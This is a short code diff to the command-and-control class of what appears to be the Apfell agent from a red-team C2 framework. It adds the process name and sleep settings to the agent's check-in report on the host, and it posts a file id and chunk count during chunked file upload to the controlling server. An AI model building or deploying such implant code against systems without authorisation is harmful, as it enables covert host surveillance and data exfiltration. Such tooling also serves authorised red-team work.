@@ -224,6 +224,8 @@ class customC2 extends baseC2{
 		//get info about system to check in initially
 		//needs IP, PID, user, host, payload_type
 		let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch, "domain": domain, "action": "checkin"};
+		info["process_name"] = apfell.procInfo.processName.js;
+		info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
 		if(user === "root"){
 		    info['integrity_level'] = 3;
 		}
@@ -438,6 +440,10 @@ class customC2 extends baseC2{
             let registerFile = this.postResponse(task, registerData);
             registerFile = registerFile['responses'][0];
             if (registerFile['status'] === "success"){
+            	this.postResponse(task, {"user_output": JSON.stringify({
+						"agent_file_id": registerFile["file_id"],
+						"total_chunks": numOfChunks
+					})});
                 handle.seekToFileOffset(0);
                 let currentChunk = 1;
                 let data = handle.readDataOfLength(chunkSize);
